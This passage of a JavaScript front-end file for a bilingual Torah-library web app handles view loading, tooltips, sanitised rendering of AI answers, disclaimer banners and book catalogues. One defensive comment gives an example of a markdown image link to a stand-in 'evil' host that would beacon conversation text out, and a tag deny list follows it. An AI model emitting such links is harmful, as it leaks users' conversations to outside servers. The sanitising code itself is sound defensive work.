/**
 * shell.js -- the app's main script (it used to be an inline <script> at the end of
 * templates/index.html's <body>).
 *
 * Inline, its ~600 KB were most of the page's HTML: fetched and parsed with the
 * markup, in competition with the stylesheets the first paint waits for. As a file
 * it is `defer`red, cached on its own content-hashed URL (backend/module_versions.py
 * asset_url) and no longer part of every HTML response.
 *
 * A classic script, run after parsing and in document order with the other deferred
 * scripts: after the head's (Sentry, marked, DOMPurify, FullCalendar, Clerk), before
 * actions.js (its click listener has to be registered first -- tests/
 * test_inline_handlers.py), the Motion CDN script and the ES modules (main.js ...).
 * Its top-level const/let/function declarations are globals shared with all of them,
 * exactly as they were inline.
 *
 * Nothing here is templated: the icon paths it draws are read from the page's
 * <script type="application/json" id="phosphorPaths"> (rendered from
 * templates/components/icons.html, which knows the icon set).
 */

// SVG path data for the icons this script draws (see the header).
const PHOSPHOR_PATHS = (() => {
    try {
        return JSON.parse(document.getElementById('phosphorPaths')?.textContent || '{}');
    } catch {
        return {};
    }
})();
const phosphorPathMarkup = (name) => `<path d="${PHOSPHOR_PATHS[name] || ''}"/>`;

// "<title> <section>" references are matched with the title as words separated
// by whitespace. Written as `(.+?)\s+<section>` the title and the whitespace after
// it can both take the same run of spaces, and a long run backtracks quadratically.
const REF_TITLE = String.raw`(\S+(?:\s+\S+)*?)`;
const refPattern = (section, flags = '') => new RegExp(String.raw`^${REF_TITLE}\s+${section}$`, flags);
const CHAPTER_REF_RE = refPattern(String.raw`(\d+)(?::\d+)?`);
const INDEX_SECTION_RE = refPattern(String.raw`(\d+[ab]?)`, 'i');
const TALMUD_REF_RE = refPattern(String.raw`(\d+)([ab])(?::(\d+))?`, 'i');
const CHAPTER_RANGE_REF_RE = refPattern(String.raw`(\d+):(\d+)-(\d+):(\d+)`);
const CHAPTER_VERSE_REF_RE = refPattern(String.raw`(\d+)(?::(\d+))?`);
const COMMENTARY_ON_RE = refPattern(String.raw`on\s+(\S.*)`, 'i');
const TRAILING_SECTION_RE = refPattern(String.raw`\d+[a-b]?(?:[:.]\d+[a-b]?)*(?:-\d+(?:[:.]\d+)*)?`, 'i');

// A whitespace run that holds a newline is that newline; any other run is kept.
const newlineIfAny = (run) => (run.includes('\n') ? '\n' : run);

// `text` without the slashes at its end (what /\/+$/ would strip, without its rescans).
function trimTrailingSlashes(text) {
    let end = text.length;
    while (end > 0 && text[end - 1] === '/') end -= 1;
    return text.slice(0, end);
}

// `text` without the whitespace before each comma (what /\s+,/g would strip, without its rescans).
function closeUpCommas(text) {
    return text.split(',').map((piece, i, all) => (i < all.length - 1 ? piece.trimEnd() : piece)).join(',');
}

// Whether `text` holds a "(" with a ")" after at least one character of content.
function hasParenthetical(text) {
    const open = text.indexOf('(');
    return open >= 0 && text.includes(')', open + 2);
}

        // Initial-route gate for hydrateRoute()/hydratePreferences() (see
        // hydrateRoute below). Declared first so both stay callable even if a
        // later top-level statement in this script throws.
        let preferencesHydrated = false;
        let pendingInitialRoute = null;
        // The language on screen, which a link's ?lang= can make differ from
        // the saved one. Declared up here because t() runs long before the
        // language code below is reached. Until the first toggleLanguage, the
        // head script's choice on <html lang>.
        let displayedLanguage = '';
        // Whether the language on screen came from the URL (a one-load
        // override); an entry without ?lang= then restores the saved one.
        let languageFromRoute = false;
        const searchForm = document.getElementById('searchForm');
        const searchInput = document.getElementById('searchInput');
        const searchSuggestions = document.getElementById('searchSuggestions');
        const openAiSettingsBtn = document.getElementById('openAiSettingsBtn');
        const bookmarkCurrentBtn = document.getElementById('bookmarkCurrentBtn');
        const semanticBookmarkBtn = document.getElementById('semanticBookmarkBtn');
        const showLeftSidebarTopBtn = document.getElementById('showLeftSidebarTopBtn');
        const settingsMenuBtn = document.getElementById('settingsMenuBtn');
        const settingsPanel = document.getElementById('settingsPanel');
        const settingsMenuContainer = document.getElementById('settingsMenuContainer');
        const themeToggleBtn = document.getElementById('themeToggleBtn');
        const themeToggleLabel = document.getElementById('themeToggleLabel');
        const brandHomeBtn = document.getElementById('brandHomeBtn');
        const transliterationToggle = document.getElementById('transliterationToggle');
        const shulModeToggle = document.getElementById('shulModeToggle');
        const shulSubControls = document.getElementById('shulSubControls');
        const shulAutoScrollToggle = document.getElementById('shulAutoScrollToggle');
        const shulScrollSpeed = document.getElementById('shulScrollSpeed');
        const showVowelsToggle = document.getElementById('showVowelsToggle');
        const showCantillationToggle = document.getElementById('showCantillationToggle');
        const cantillationToggleRow = document.getElementById('cantillationToggleRow');
        const exportCitationBtn = document.getElementById('exportCitationBtn');
        const exportFormatSelect = document.getElementById('exportFormatSelect');
        const libraryIndexSidebar = document.getElementById('libraryIndexSidebar');
        const libraryIndexModal = document.getElementById('libraryIndexModal');
        const libraryIndexFilterInput = document.getElementById('libraryIndexFilterInput');
        const libraryIndexFilterClear = document.getElementById('libraryIndexFilterClear');
        const readerSubtitle = document.getElementById('readerSubtitle');
        const personalShelf = document.getElementById('personalShelf');
        const authControls = document.getElementById('authControls');
        const userProfileMenuContainer = document.getElementById('userProfileMenuContainer');
        const userProfileMenuBtn = document.getElementById('userProfileMenuBtn');
        const userProfileMenu = document.getElementById('userProfileMenu');
        const userProfileMenuLabel = document.getElementById('userProfileMenuLabel');
        const userProfileSignOutAction = document.getElementById('userProfileSignOutAction');
        const userProfileLink = document.getElementById('userProfileLink');
        const signInBtn = document.getElementById('signInBtn');
        const mobileBottomTabs = document.getElementById('mobileBottomTabs');
        const mobileLangToggle = document.getElementById('mobileLangToggle');
        const closeLeftSidebarBtn = document.getElementById('closeLeftSidebarBtn');
        const closeRightSidebarBtn = document.getElementById('closeRightSidebarBtn');
        const hideLeftSidebarBtn = document.getElementById('hideLeftSidebarBtn');
        const hideRightSidebarBtn = document.getElementById('hideRightSidebarBtn');
        const mobileDrawerBackdrop = document.getElementById('mobileDrawerBackdrop');
        const leftSidebar = document.getElementById('leftSidebar');
        const rightSidebar = document.getElementById('rightSidebar');

        const readerSettingsBtn = document.getElementById('readerSettingsBtn');
        const readerSettingsBtnLabel = document.getElementById('readerSettingsBtnLabel');
        const readerSettingsPanel = document.getElementById('readerSettingsPanel');
        const readerLayoutSelect = document.getElementById('readerLayoutSelect');
        const readerFontSize = document.getElementById('readerFontSize');
        const readerLineHeight = document.getElementById('readerLineHeight');
        const shulAutoScrollStatus = document.getElementById('shulAutoScrollStatus');

        const devtoolsInspectorModal = document.getElementById('devtoolsInspectorModal');
        const closeDevtoolsInspectorBtn = document.getElementById('closeDevtoolsInspectorBtn');
        const devtoolsLog = document.getElementById('devtoolsLog');
        const chapterGridModal = document.getElementById('chapterGridModal');
        const chapterGridParashaStrip = document.getElementById('chapterGridParashaStrip');
        const chapterGridItems = document.getElementById('chapterGridItems');
        const chapterGridTitle = document.getElementById('chapterGridTitle');
        const chapterGridSubtitle = document.getElementById('chapterGridSubtitle');
        const closeChapterGridModalBtn = document.getElementById('closeChapterGridModalBtn');
        const readerTopBar = document.getElementById('readerTopBar');
        const readerLibraryTopBarBtn = document.getElementById('readerLibraryTopBarBtn');
        const readerPrevTopBarBtn = document.getElementById('readerPrevTopBarBtn');
        const readerNextTopBarBtn = document.getElementById('readerNextTopBarBtn');
        const readerCommentaryTopBarBtn = document.getElementById('readerCommentaryTopBarBtn');

        const homeGrid = document.getElementById('homeGrid');
        const reader = document.getElementById('reader');
        const mainContainer = document.getElementById('mainContainer');

        // Monotonic request-generation counter for readText(): without this, a
        // slow first selection's response can resolve AFTER a faster second
        // selection's and overwrite its already-rendered content with stale data.
        let _readTextRequestGen = 0;

        // Every loader ends here, in the same task that shows its view: the
        // view-swap flag and the cold-load flag both clear together.
        function finishViewSwap() {
            mainContainer?.classList.remove('is-swapping-view');
            delete document.documentElement.dataset.coldView;
        }

        // ─── Reader loads (audit L-1, L-2) ───────────────────────────────
        // A text, prayer or community load keeps the page: the reader shows
        // at once with its title and verse-shaped rows where the text will be
        // (#readerSkeleton, the same thing a cold load paints first), and the
        // text fades in over them. Nothing covers the page, so the visitor can
        // go elsewhere mid-load (cancelReaderLoad).
        const readerSkeleton = document.getElementById('readerSkeleton');
        // A text renders into #readerSources; a prayer, a community or an
        // error into #readerContent. Both fade in.
        const readerBodies = () => ['readerContent', 'readerSources'].map((id) => document.getElementById(id)).filter(Boolean);
        readerBodies().forEach((el) => el.addEventListener('animationend', (event) => {
            if (event.target === el) el.classList.remove('reader-content-enter');
        }));

        // A change of view (home, a text, a prayer, the history page) runs
        // `swap` -- synchronous: the old view out, the new one's skeleton in --
        // inside a view transition where they're on (motion.js
        // transitionView), else at once. Returns a promise for when the swap
        // has run (a frame later under a transition): a caller that goes on
        // to render into the new view awaits it. `_viewNavDirection` is the
        // way the navigation under way goes: hydrateRoute sets it for Back
        // and Forward (null on the first load: no transition), and every
        // other navigation is forward.
        let _viewNavDirection = 'forward';
        function swapView(swap, { transition = true } = {}) {
            const direction = _viewNavDirection;
            // motion.js not there yet (a click before the module has run) or
            // blocked: no transition to swap inside, so the swap runs at once.
            const motion = transition && direction ? window.ShelahMotion : null;
            const vt = motion?.transitionView
                ? motion.transitionView(swap, { direction })
                : (swap(), null);
            if (!vt) return Promise.resolve();
            vt.updateCallbackDone.catch((err) => window.reportError?.(err));
            return vt.updateCallbackDone.catch(() => {});
        }

        // `toolbar`: a text, whose toolbar (#readerTopBar) keeps or takes its
        // place while it loads, its buttons held back (.is-pending); other
        // views have none. Either way the column's top padding that clears
        // the bar (syncReaderTopBarOffset) settles now, at the click: settled
        // when the content lands, it pushed the skeleton down (CLS 0.1).
        function showReaderSkeleton(title = '', { toolbar = false } = {}) {
            const content = document.getElementById('readerContent');
            // A retry still pending for the view this one replaces is dropped.
            window.ShelahLoadRegion?.abortRegion(content);
            mainContainer?.classList.add('is-swapping-view');
            reader.classList.add('is-loading');
            // The last view's data goes with it: a language switch re-renders
            // a prayer or community still set here (toggleLanguage), over
            // whatever this load shows.
            window.currentPrayerContent = null;
            window.currentCommunityData = null;
            document.getElementById('readerTitle').textContent = title;
            content.innerHTML = '';
            document.getElementById('readerSources').innerHTML = '';
            readerSkeleton?.classList.remove('hidden');
            reader.classList.remove('hidden');
            readerTopBar?.classList.toggle('hidden', !toolbar);
            readerTopBar?.classList.toggle('is-pending', toolbar);
            syncReaderTopBarOffset();
            window.ShelahLoadRegion?.setRegionBusy(reader, true);
            scrollPrimaryToTop('instant');
        }

        // `loaded`: the view arrived, so it fades in where the skeleton stood
        // and "Loaded" is announced. Otherwise it failed (its alert speaks
        // for it) or was called off.
        function hideReaderSkeleton({ loaded = true } = {}) {
            const wasShown = Boolean(readerSkeleton && !readerSkeleton.classList.contains('hidden'));
            readerSkeleton?.classList.add('hidden');
            reader.classList.remove('is-loading');
            readerTopBar?.classList.remove('is-pending');
            window.ShelahLoadRegion?.setRegionBusy(reader, false, { quiet: !loaded });
            if (loaded && wasShown) {
                readerBodies().forEach((el) => {
                    el.classList.remove('reader-content-enter');
                    el.getBoundingClientRect(); // restart it if a load a moment ago started it
                    el.classList.add('reader-content-enter');
                });
            }
            finishViewSwap();
        }

        // Home, the history page or any other view taking over: a reader load
        // still on its way is dropped (its answer, its retries, its skeleton).
        function cancelReaderLoad() {
            _readTextRequestGen += 1;
            window.ShelahLoadRegion?.abortRegion(document.getElementById('readerContent'));
            if (readerSkeleton && !readerSkeleton.classList.contains('hidden')) hideReaderSkeleton({ loaded: false });
        }

        // L-2: a load that first asks the network whether to open a grid
        // (a book's sections, a prayer's parts) shows it on the control that
        // started it, not with an overlay. That control is the one clicked in
        // the last second, else the focused one (Enter in a list). Returns
        // the undo.
        let _lastClickedControl = null;
        let _lastClickedAt = 0;
        document.addEventListener('click', (event) => {
            _lastClickedControl = event.target?.closest?.('button, a, [role="button"], [role="link"], [role="option"], [role="treeitem"]') || null;
            _lastClickedAt = performance.now();
        }, true);
        function markTriggerPending() {
            const clicked = performance.now() - _lastClickedAt < 1000 && _lastClickedControl?.isConnected
                ? _lastClickedControl : null;
            const focused = document.activeElement && document.activeElement !== document.body ? document.activeElement : null;
            const control = clicked || focused;
            if (!control || control.dataset.pending !== undefined) return () => {};
            control.dataset.pending = 'true';
            control.setAttribute('aria-busy', 'true');
            return () => {
                delete control.dataset.pending;
                control.removeAttribute('aria-busy');
            };
        }

        // L-8: a list whose fetch failed. Each of its regions shows the
        // shared alert with Retry; it retries by itself after 2 s and 6 s and
        // when the connection comes back. `reload(attempt)` runs the loader
        // again (a manual Retry starts over at 0), with the region's skeleton
        // back and "Loading…" / "Loaded" on its status line meanwhile.
        const listRegionSkeletons = new WeakMap();
        function failListRegions(regions, message, reload, attempt = 0) {
            const api = window.ShelahLoadRegion;
            const els = regions.filter(Boolean);
            if (!api || !els.length) return;
            els.forEach((el) => {
                if (!listRegionSkeletons.has(el)) listRegionSkeletons.set(el, el.innerHTML);
            });
            const retry = async (next) => {
                els.forEach((el) => {
                    el.innerHTML = listRegionSkeletons.get(el) || '';
                    api.setRegionBusy(el, true);
                });
                await reload(next);
                els.forEach((el) => {
                    if (!el.querySelector('[role="alert"]')) api.setRegionBusy(el, false);
                });
            };
            els.forEach((el) => {
                // A list keeps list children: its alert goes in an <li>.
                const isList = /^(UL|OL)$/.test(el.tagName);
                if (isList) el.textContent = '';
                const host = isList ? el.appendChild(document.createElement('li')) : el;
                api.renderRegionError(host, { message, retry: () => { void retry(0); } });
                el.setAttribute('aria-busy', 'false');
            });
            api.retryLater(els[0], (next) => { void retry(next); }, { attempt });
        }

        // Screens rise into place instead of popping. Whenever one of these
        // goes from hidden to shown -- through any of the many paths that
        // toggle them (readText, goHome, displayPrayer, displayCommunity,
        // ...) -- it replays a short entrance (.view-enter,
        // style.css; transform + opacity only, off under
        // reduced motion). Watching the attributes keeps this in one place.
        // (#readerTopBar already fades up on show via ai.css.)
        // attributeOldValue catches a hide + re-show inside one task (a
        // cached text swapping into an already-open reader) as well.
        function watchViewEntrance(el, enterClass = 'view-enter') {
            if (!el || typeof MutationObserver === 'undefined') return;
            const isShown = () => !el.classList.contains('hidden') && el.style.display !== 'none';
            const wasHidden = (record) => (record.attributeName === 'class'
                ? /(^|\s)hidden(\s|$)/.test(record.oldValue || '')
                : /display:\s*none/.test(record.oldValue || ''));
            let shown = isShown();
            new MutationObserver((records) => {
                const now = isShown();
                // A view transition (swapView) animates this change itself.
                const inTransition = document.documentElement.dataset.vtActive !== undefined;
                if (now && !inTransition && (!shown || records.some(wasHidden))) {
                    el.classList.remove(enterClass);
                    el.getBoundingClientRect(); // restart the animation if it was mid-play
                    el.classList.add(enterClass);
                }
                shown = now;
            }).observe(el, { attributes: true, attributeFilter: ['class', 'style'], attributeOldValue: true });
            el.addEventListener('animationend', (e) => {
                if (e.target === el) el.classList.remove(enterClass);
            });
        }
        watchViewEntrance(homeGrid);
        watchViewEntrance(reader);

        const sidebarContent = document.getElementById('sourcesDynamicContent');
        const selectionInsights = document.getElementById('selectionInsights');
        const selectionInsightsBody = document.getElementById('selectionInsightsBody');
        const selectionInsightsHint = document.getElementById('selectionInsightsHint');
        watchViewEntrance(selectionInsights);

        let infiniteReaderState = {
            loading: false,
            loadingPrev: false,
            nextRef: '',
            prevRef: '',
            // The haftarah ({ ref, heTitle }) that follows the weekly parasha the
            // reader has open; nextRef is that ref until it has been appended.
            haftarah: null,
            seenRefs: new Set(),
            currentVisibleChunkIndex: 0,
            sectionObserver: null,
        };
        window.currentTextPayloadChain = [];
        let suggestionFetchSerial = 0;
        let suppressSuggestionMenu = false;

        const APP_PREFS_KEY = "Sh'elahPrefs";
        const APP_SHELF_KEY = "Sh'elahShelf";
        const LANGUAGE_MANUAL_KEY = "Sh'elahLanguageManuallySet";

        const DELAYED_TOOLTIP_SELECTORS = '.chapter-grid-item, .chapter-grid-parasha-link, .chapter-grid-section-items button, .library-node-open, .home-library-link';
        let delayedTooltipTimer = null;
        let delayedTooltipEl = null;

        function getTooltipText(el) {
            if (!el) return '';
            const lang = getCurrentLanguage();
            if (lang && el.dataset[lang]) {
                return String(el.dataset[lang] || '').trim();
            }
            if (el.dataset.tooltip) return String(el.dataset.tooltip || '').trim();
            if (el.dataset.title) return decodeURIComponent(String(el.dataset.title || '').trim());
            if (el.title) return String(el.title || '').trim();
            return '';
        }

        function showDelayedTooltip(el) {
            const text = getTooltipText(el);
            if (!text) return;
            if (!delayedTooltipEl) {
                delayedTooltipEl = document.createElement('div');
                delayedTooltipEl.id = 'delayedTooltip';
                delayedTooltipEl.className = 'delayed-tooltip';
                document.body.appendChild(delayedTooltipEl);
            }
            delayedTooltipEl.textContent = text;
            const rect = el.getBoundingClientRect();
            const left = Math.min(window.innerWidth - 16, Math.max(16, rect.left + rect.width / 2));
            const top = Math.max(16, rect.top - 10);
            delayedTooltipEl.style.left = `${left}px`;
            delayedTooltipEl.style.top = `${top}px`;
            delayedTooltipEl.classList.add('visible');
        }

        function hideDelayedTooltip() {
            if (delayedTooltipTimer) {
                clearTimeout(delayedTooltipTimer);
                delayedTooltipTimer = null;
            }
            if (delayedTooltipEl) {
                delayedTooltipEl.classList.remove('visible');
            }
        }

        document.addEventListener('mouseover', function (e) {
            const target = e.target.closest(DELAYED_TOOLTIP_SELECTORS);
            if (!target || !e.isTrusted || (e.pointerType && e.pointerType !== 'mouse')) return;
            const text = getTooltipText(target);
            if (!text) return;
            if (target.title && !target.dataset.tooltip) {
                target.dataset.tooltip = target.title;
                target.removeAttribute('title');
            }
            delayedTooltipTimer = setTimeout(() => showDelayedTooltip(target), 1100);
        });

        document.addEventListener('mouseout', function (e) {
            const target = e.target.closest(DELAYED_TOOLTIP_SELECTORS);
            if (!target) return;
            const related = e.relatedTarget;
            if (related && target.contains(related)) return;
            hideDelayedTooltip();
        });

        document.addEventListener('scroll', hideDelayedTooltip, true);
        document.addEventListener('mousedown', hideDelayedTooltip);

        if (window.marked && typeof window.marked.setOptions === 'function') {
            marked.setOptions({
                gfm: true,
                breaks: true,
                mangle: false,
                headerIds: false,
            });
        }

        function normalizeMarkdownSpacing(markdownText) {
            let normalized = String(markdownText || '').replace(/\r\n?/g, '\n');

            // Split inline headers/rules onto their own line before structural spacing enforcement.
            // (A gap of more than 64 whitespace characters is not looked through: it keeps the backtracking bounded.)
            normalized = normalized
                .replace(/([^\n#])\s{0,64}(#{2,6}\s*)/g, '$1\n$2')
                .replace(/(^|\n)(#{2,6})([^\s#])/g, '$1$2 $3')
                .replace(/([^\n])\s{0,64}---\s{0,64}([^\n])/g, '$1\n---\n$2')
                .replace(/([^\n])\s{0,64}---(\n|$)/g, '$1\n---$2')
                .replace(/(^|\n)---\s*([^\n])/g, '$1---\n$2');

            const lines = normalized.split('\n');
            const out = [];

            const trimTrailingBlankLines = () => {
                while (out.length > 0 && out.at(-1) === '') {
                    out.pop();
                }
            };

            lines.forEach((line) => {
                const trimmed = line.trim();
                const isHeader = /^#{2,6}\s+\S/.test(trimmed);
                const isRule = /^---$/.test(trimmed);

                if (isHeader) {
                    trimTrailingBlankLines();
                    if (out.length > 0) {
                        out.push('', '');
                    }
                    out.push(trimmed, '');
                    return;
                }

                if (isRule) {
                    trimTrailingBlankLines();
                    if (out.length > 0) {
                        out.push('');
                    }
                    out.push('---', '');
                    return;
                }

                out.push(line);
            });

            return out.join('\n').replace(/\n{5,}/g, '\n\n\n\n').trim();
        }

        // DOMPurify keeps data-* attributes by default. static/js/actions.js
        // turns data-onclick/-oninput into calls to allowlisted functions, so
        // HTML the model wrote must never be able to carry one (an inline
        // onclick would have been stripped; a data attribute is not). A
        // literal, not window.ShelahActions.ATTRIBUTES: that script loads
        // after this one. tests/test_inline_handlers.py keeps the two equal.
        const ACTION_ATTRIBUTES = ['data-onclick', 'data-onclick-arg', 'data-onclick-encoding', 'data-oninput'];
        // CSP allows img-src https:, so a model-emitted ![](https://evil/?q=...)
        // would beacon conversation text out. Answers are prose; no embeds/forms.
        const ANSWER_FORBIDDEN_TAGS = ['img', 'picture', 'source', 'video', 'audio', 'form', 'input', 'textarea', 'button', 'select', 'style', 'link', 'meta', 'iframe', 'object', 'embed', 'svg', 'math'];

        function renderAnswerMarkdown(answerText) {
            const raw = normalizeMarkdownSpacing(String(answerText || 'No synthesis available.'));
            if (window.marked && typeof window.marked.parse === 'function') {
                const html = marked.parse(raw);
                return (window.DOMPurify && typeof window.DOMPurify.sanitize === 'function')
                    ? DOMPurify.sanitize(html, { USE_PROFILES: { html: true }, FORBID_ATTR: ACTION_ATTRIBUTES, FORBID_TAGS: ANSWER_FORBIDDEN_TAGS })
                    : html;
            }

            return raw
                .replaceAll('&', '&amp;')
                .replaceAll('<', '&lt;')
                .replaceAll('>', '&gt;')
                .replaceAll('"', '&quot;')
                .replaceAll("'", '&#39;')
                .replaceAll('\n', '<br>');
        }

        // safety_class values that short-circuit synthesis into a referral
        // (backend/claude.py SAFETY_REFERRAL_CLASSES) plus the domain-refusal
        // class -- all of these render the prominent referral variant.
        // "sensitive_intimate" and "ok" stay on the standard variant since
        // they're still answered under AGE_APPROPRIATE_DIRECTIVE, not blocked.
        const SAFETY_REFERRAL_UI_CLASSES = new Set([
            'medical', 'mental_health_or_self_harm', 'abuse_or_minor_safety', 'dangerous_or_illegal',
        ]);

        // Trusted, static icon markup only -- same pattern as
        // _PRIVACY_STATUS_ICONS below (built once at load from the server-rendered path data into
        // raw <path> markup, never combined with dynamic data via innerHTML;
        // the banner's message text is always escaped separately below).
        const _DISCLAIMER_BANNER_ICONS = {
            breaker: phosphorPathMarkup('pause'),
            referral: phosphorPathMarkup('warning'),
            standard: phosphorPathMarkup('book-open'),
        };
        const _DISCLAIMER_BANNER_ROLES = { breaker: 'status', referral: 'alert', standard: 'note' };

        function disclaimerBannerText(kind) {
            if (kind === 'breaker') {
                return t(
                    'AI answers are paused for today to stay within our usage budget — you can still browse and search the full Torah library. Please try again after midnight UTC.',
                    'תשובות בינה מלאכותית מושהות להיום כדי להישאר בתקציב השימוש שלנו — ניתן עדיין לעיין ולחפש בספריית התורה המלאה. אנא נסה/י שוב לאחר חצות בשעון UTC.'
                );
            }
            if (kind === 'referral') {
                return t(
                    'This touches on safety or wellbeing. Please see the guidance above and reach out to a qualified professional, your rabbi, or a trusted adult for next steps — this is AI-generated educational information, not a halachic ruling.',
                    'נושא זה נוגע לבטיחות או לרווחה. אנא עיין/י בהנחיה שלמעלה ופנה/י לאיש/אשת מקצוע מוסמך/ת, לרב שלך, או למבוגר/ת אמון לצעדים הבאים — זהו מידע חינוכי שנוצר על ידי בינה מלאכותית ולא פסיקה הלכתית.'
                );
            }
            return t(
                'AI-generated educational information, not a binding halachic ruling — always consult your rabbi for practical guidance.',
                'מידע חינוכי שנוצר על ידי בינה מלאכותית, לא פסיקה הלכתית מחייבת — יש להתייעץ תמיד עם הרב שלך לקבלת הנחיה מעשית.'
            );
        }

        // Persistent, non-dismissible disclaimer banner --
        // rendered fresh on every answer so it can never be scrolled-past-once
        // and forgotten, and so referral-class answers get a
        // visually distinct, prominent variant instead of blending into the
        // ordinary answer chrome.
        function renderDisclaimerBanner(bannerEl, safetyClass, breakerTripped) {
            if (!bannerEl) return;
            bannerEl.classList.remove('hidden');
            const isReferral = SAFETY_REFERRAL_UI_CLASSES.has(String(safetyClass || 'ok'));
            // breakerTripped takes precedence over
            // the ordinary referral/note split -- the global cost breaker always
            // reports safety_class "ok" (asgi.py::_ask_async_breaker_paused_payload),
            // so these two states never actually collide in practice, but checking
            // breakerTripped first keeps that true even if that changes later.
            bannerEl.classList.toggle('ai-disclaimer-banner--breaker-paused', !!breakerTripped);
            bannerEl.classList.toggle('ai-disclaimer-banner--referral', isReferral && !breakerTripped);
            let kind = 'standard';
            if (breakerTripped) kind = 'breaker';
            else if (isReferral) kind = 'referral';
            bannerEl.setAttribute('role', _DISCLAIMER_BANNER_ROLES[kind]);
            const iconPath = _DISCLAIMER_BANNER_ICONS[kind];
            const text = disclaimerBannerText(kind);
            bannerEl.innerHTML = `<span class="ai-disclaimer-banner-icon" aria-hidden="true"><svg viewBox="0 0 256 256" fill="currentColor" aria-hidden="true">${iconPath}</svg></span>`
                + `<span class="ai-disclaimer-banner-text">${escapeHtml(text)}</span>`;
        }
        const READER_LAYOUT_MANUAL_KEY = "Sh'elahReaderLayoutManuallySet";
        const PARASHA_CACHE_TTL_MS = 1000 * 60 * 60;
        const POPULAR_TEXTS_CACHE_TTL_MS = 1000 * 60 * 60 * 12;
        // Verse-accurate portion starts ({chapter, verse, name}) from
        // static/js/hebrew-ref.js, which carries Sefaria's boundaries.
        const hebrewRef = window.ShelahHebrewRef;
        const TORAH_PARASHA_BY_BOOK = hebrewRef ? hebrewRef.parashotByBook() : {};

        const CHAPTER_GRID_BOOKS = Object.freeze({
            Genesis: 50,
            Exodus: 40,
            Leviticus: 27,
            Numbers: 36,
            Deuteronomy: 34,
            Joshua: 24,
            Judges: 21,
            'I Samuel': 31,
            'II Samuel': 24,
            'I Kings': 22,
            'II Kings': 25,
            Isaiah: 66,
            Jeremiah: 52,
            Ezekiel: 48,
            Hosea: 14,
            Joel: 4,
            Amos: 9,
            Obadiah: 1,
            Jonah: 4,
            Micah: 7,
            Nahum: 3,
            Habakkuk: 3,
            Zephaniah: 3,
            Haggai: 2,
            Zechariah: 14,
            Malachi: 3,
            Psalms: 150,
            Proverbs: 31,
            Job: 42,
            'Song of Songs': 8,
            Ruth: 4,
            Lamentations: 5,
            Ecclesiastes: 12,
            Esther: 10,
            Daniel: 12,
            Ezra: 10,
            Nehemiah: 13,
            'I Chronicles': 29,
            'II Chronicles': 36,
        });

        const HOME_LIBRARY_CATEGORIES = {
            tanakh: {
                title: 'Tanakh', titleHe: 'תנ״ך',
                sections: [
                    {
                        title: 'Torah', titleHe: 'תורה',
                        items: [
                            { label: 'Genesis', labelHe: 'בראשית', ref: 'Genesis', chapters: 50 },
                            { label: 'Exodus', labelHe: 'שמות', ref: 'Exodus', chapters: 40 },
                            { label: 'Leviticus', labelHe: 'ויקרא', ref: 'Leviticus', chapters: 27 },
                            { label: 'Numbers', labelHe: 'במדבר', ref: 'Numbers', chapters: 36 },
                            { label: 'Deuteronomy', labelHe: 'דברים', ref: 'Deuteronomy', chapters: 34 },
                        ]
                    },
                    {
                        title: "Prophets (Nevi'im)", titleHe: 'נביאים',
                        items: [
                            { label: 'Joshua', labelHe: 'יהושע', ref: 'Joshua', chapters: 24 },
                            { label: 'Judges', labelHe: 'שופטים', ref: 'Judges', chapters: 21 },
                            { label: 'I Samuel', labelHe: 'שמואל א', ref: 'I Samuel', chapters: 31 },
                            { label: 'II Samuel', labelHe: 'שמואל ב', ref: 'II Samuel', chapters: 24 },
                            { label: 'I Kings', labelHe: 'מלכים א', ref: 'I Kings', chapters: 22 },
                            { label: 'II Kings', labelHe: 'מלכים ב', ref: 'II Kings', chapters: 25 },
                            { label: 'Isaiah', labelHe: 'ישעיהו', ref: 'Isaiah', chapters: 66 },
                            { label: 'Jeremiah', labelHe: 'ירמיהו', ref: 'Jeremiah', chapters: 52 },
                            { label: 'Ezekiel', labelHe: 'יחזקאל', ref: 'Ezekiel', chapters: 48 },
                            { label: 'Hosea', labelHe: 'הושע', ref: 'Hosea', chapters: 14 },
                            { label: 'Joel', labelHe: 'יואל', ref: 'Joel', chapters: 4 },
                            { label: 'Amos', labelHe: 'עמוס', ref: 'Amos', chapters: 9 },
                            { label: 'Obadiah', labelHe: 'עובדיה', ref: 'Obadiah', chapters: 1 },
                            { label: 'Jonah', labelHe: 'יונה', ref: 'Jonah', chapters: 4 },
                            { label: 'Micah', labelHe: 'מיכה', ref: 'Micah', chapters: 7 },
                            { label: 'Nahum', labelHe: 'נחום', ref: 'Nahum', chapters: 3 },
                            { label: 'Habakkuk', labelHe: 'חבקוק', ref: 'Habakkuk', chapters: 3 },
                            { label: 'Zephaniah', labelHe: 'צפניה', ref: 'Zephaniah', chapters: 3 },
                            { label: 'Haggai', labelHe: 'חגי', ref: 'Haggai', chapters: 2 },
                            { label: 'Zechariah', labelHe: 'זכריה', ref: 'Zechariah', chapters: 14 },
                            { label: 'Malachi', labelHe: 'מלאכי', ref: 'Malachi', chapters: 3 },
                        ]
                    },
                    {
                        title: 'Writings (Ketuvim)', titleHe: 'כתובים',
                        items: [
                            { label: 'Psalms', labelHe: 'תהילים', ref: 'Psalms', chapters: 150 },
                            { label: 'Proverbs', labelHe: 'משלי', ref: 'Proverbs', chapters: 31 },
                            { label: 'Job', labelHe: 'איוב', ref: 'Job', chapters: 42 },
                            { label: 'Song of Songs', labelHe: 'שיר השירים', ref: 'Song of Songs', chapters: 8 },
                            { label: 'Ruth', labelHe: 'רות', ref: 'Ruth', chapters: 4 },
                            { label: 'Lamentations', labelHe: 'איכה', ref: 'Lamentations', chapters: 5 },
                            { label: 'Ecclesiastes', labelHe: 'קהלת', ref: 'Ecclesiastes', chapters: 12 },
                            { label: 'Esther', labelHe: 'אסתר', ref: 'Esther', chapters: 10 },
                            { label: 'Daniel', labelHe: 'דניאל', ref: 'Daniel', chapters: 12 },
                            { label: 'Ezra', labelHe: 'עזרא', ref: 'Ezra', chapters: 10 },
                            { label: 'Nehemiah', labelHe: 'נחמיה', ref: 'Nehemiah', chapters: 13 },
                            { label: 'I Chronicles', labelHe: 'דברי הימים א', ref: 'I Chronicles', chapters: 29 },
                            { label: 'II Chronicles', labelHe: 'דברי הימים ב', ref: 'II Chronicles', chapters: 36 },
                        ]
                    }
                ]
            },
            mishnah: {
                title: 'Mishnah', titleHe: 'משנה',
                sections: [
                    {
                        title: 'Zeraim (Seeds)', titleHe: 'זרעים',
                        items: [
                            { label: 'Berakhot', labelHe: 'ברכות', ref: 'Mishnah Berakhot', chapters: 9 },
                            { label: 'Peah', labelHe: 'פאה', ref: 'Mishnah Peah', chapters: 8 },
